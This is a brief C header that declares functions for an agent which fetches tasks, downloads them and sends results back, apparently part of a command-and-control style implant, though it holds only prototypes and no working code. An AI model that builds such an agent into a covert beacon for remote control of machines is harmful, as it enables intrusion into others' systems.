
#pragma once
#include "Parser/Parser.h"


#if defined(_WIN32) || defined(_WIN64)
#include <windows.h>
#endif

int DownloadTask(char *TaskType , PPARSER Parser);
int SendResult(unsigned char *Data,int DataSize,char* Type1,char* Type2);
int GetTask();
int AskTask();
int AgentManager();